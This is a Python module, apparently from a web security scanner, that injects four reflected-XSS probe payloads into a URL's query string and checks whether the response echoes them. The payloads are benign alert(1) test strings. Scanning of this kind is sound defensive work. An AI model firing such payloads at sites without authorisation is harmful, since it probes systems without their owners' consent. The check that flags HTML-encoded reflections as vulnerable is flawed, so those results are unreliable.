import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Payloads designed to trigger XSS
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

def inject_payload(url, payload):
    """Inject payload into first query parameter."""
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    if not query:
        return f"{url}?test={payload}"

    first_param = list(query.keys())[0]
    query[first_param] = payload
    new_query = urlencode(query, doseq=True)

    return urlunparse(parsed._replace(query=new_query))

def check_xss(url):
    """Main XSS Checking Function."""
    result = {
        "vulnerable": False,
        "vulnerability": "Cross-Site Scripting (XSS)",
        "risk": "Medium",
        "details": []
    }

    headers = {"User-Agent": "Mozilla/5.0"}

    try:
        for payload in XSS_PAYLOADS:
            test_url = inject_payload(url, payload)
            response = requests.get(test_url, headers=headers, timeout=7)

            # Check if payload reflected exactly in response (basic but good first layer)
            if payload in response.text:
                result["vulnerable"] = True
                result["details"].append({
                    "payload": payload,
                    "url": test_url,
                    "reason": "Payload reflected directly in page response"
                })
                break

            # Second layer: encoded payload reflections
            encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
            if encoded_payload in response.text:
                result["vulnerable"] = True
                result["details"].append({
                    "payload": payload,
                    "url": test_url,
                    "reason": "Payload reflected but partially encoded (possible XSS)"
                })
                break

        if not result["vulnerable"]:
            result["details"].append({"note": "No XSS patterns detected."})

    except Exception as e:
        result["details"].append({"error": str(e)})

    return result
